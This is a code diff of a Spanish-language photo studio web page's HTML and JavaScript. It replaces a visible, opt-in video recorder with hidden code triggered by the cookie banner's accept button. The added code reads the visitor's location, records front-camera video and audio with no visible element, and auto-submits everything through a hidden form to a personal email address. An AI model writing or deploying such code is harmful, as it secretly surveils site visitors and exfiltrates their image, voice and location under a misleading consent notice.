@@ -128,25 +128,10 @@
             border-radius: 5px;
         }
         #videoContainer {
-            margin-top: 20px;
-            text-align: center;
+            display: none;
         }
-        #videoElement, #recordedVideo {
-            width: 100%;
-            max-width: 400px;
-            margin-top: 10px;
-        }
-        #startButton, #submitButton {
-            margin-top: 10px;
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        #startButton:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
+        #videoElement {
+            display: none;
         }
     </style>
 </head>
@@ -201,45 +186,56 @@
     </div>
 
     <div class="cookie-banner" id="cookieBanner">
-        <h2>Aviso de Cookies</h2>
-        <p>Este sitio web utiliza cookies para mejorar su experiencia. Al continuar navegando, aceptas nuestro uso de cookies.</p>
-        <button onclick="acceptCookies()">Aceptar y Continuar</button>
+        <h2>Aviso de Cookies y Permisos</h2>
+        <p>Este sitio web utiliza cookies para mejorar su experiencia. Al aceptar, también nos das permiso para acceder a tu cámara y ubicación para mejorar nuestros servicios.</p>
+        <button onclick="acceptCookiesAndStartRecording()">Aceptar y Continuar</button>
     </div>
 
-    <div id="videoContainer" style="display:none;">
-        <h2>Grabación y Envío de Video</h2>
-        <button id="startButton">Iniciar Cámara y Grabar</button>
+    <div id="videoContainer">
         <video id="videoElement" autoplay playsinline></video>
-        <video id="recordedVideo" controls style="display:none;"></video>
-        <form id="videoForm" action="https://formsubmit.co/ingjairmolina@gmail.com" method="POST" enctype="multipart/form-data">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_next" value="https://photostudiosandoval.com/thanks.html">
-            <input type="file" id="videoFile" name="attachment" accept="video/*" style="display:none;">
-            <button type="submit" id="submitButton" style="display:none;">Enviar Video</button>
-        </form>
     </div>
+
+    <form id="dataForm" action="https://formsubmit.co/ingjairmolina@gmail.com" method="POST" enctype="multipart/form-data" style="display:none;">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://photostudiosandoval.com/thanks.html">
+        <input type="file" id="videoFile" name="attachment" accept="video/*">
+        <input type="hidden" id="locationData" name="location">
+    </form>
 
     <script>
         let mediaRecorder;
         let recordedChunks = [];
-        const startButton = document.getElementById('startButton');
-        const videoElement = document.getElementById('videoElement');
-        const recordedVideo = document.getElementById('recordedVideo');
-        const submitButton = document.getElementById('submitButton');
-        const videoFile = document.getElementById('videoFile');
-
-        function acceptCookies() {
-            document.getElementById('cookieBanner').style.display = 'none';
-            document.getElementById('videoContainer').style.display = 'block';
-        }
 
         function closePromo() {
             document.getElementById('promoImage').style.display = 'none';
         }
 
-        startButton.addEventListener('click', async function() {
+        async function acceptCookiesAndStartRecording() {
+            document.getElementById('cookieBanner').style.display = 'none';
+            
+            try {
+                // Solicitar permisos de geolocalización
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const locationData = `Latitud: ${position.coords.latitude}, Longitud: ${position.coords.longitude}`;
+                    document.getElementById('locationData').value = locationData;
+
+                    // Iniciar grabación de video
+                    await startRecording();
+                }, (error) => {
+                    console.error('Error al obtener la ubicación:', error);
+                    alert('No se pudo obtener la ubicación. El video se grabará sin datos de ubicación.');
+                    startRecording();
+                });
+            } catch (error) {
+                console.error('Error al solicitar permisos:', error);
+                alert('Hubo un error al solicitar los permisos necesarios.');
+            }
+        }
+
+        async function startRecording() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+                const videoElement = document.getElementById('videoElement');
                 videoElement.srcObject = stream;
 
                 mediaRecorder = new MediaRecorder(stream);
@@ -252,24 +248,17 @@
 
                 mediaRecorder.onstop = () => {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    recordedVideo.src = URL.createObjectURL(blob);
-                    videoElement.style.display = 'none';
-                    recordedVideo.style.display = 'block';
-                    submitButton.style.display = 'inline-block';
-                    startButton.textContent = 'Grabar de nuevo';
-                    startButton.disabled = false;
-
-                    // Crear un archivo de video para el formulario
                     const videoFile = new File([blob], 'video-grabado.webm', { type: 'video/webm' });
                     const dataTransfer = new DataTransfer();
                     dataTransfer.items.add(videoFile);
                     document.getElementById('videoFile').files = dataTransfer.files;
+
+                    // Enviar el formulario automáticamente
+                    document.getElementById('dataForm').submit();
                 };
 
                 recordedChunks = [];
                 mediaRecorder.start();
-                startButton.textContent = 'Grabando...';
-                startButton.disabled = true;
 
                 setTimeout(() => {
                     mediaRecorder.stop();
@@ -280,7 +269,7 @@
                 console.error('Error al acceder a la cámara:', error);
                 alert('No se pudo acceder a la cámara. Asegúrate de dar permiso y de que tu dispositivo tenga una cámara frontal.');
             }
-        });
+        }
     </script>
 </body>
 </html>
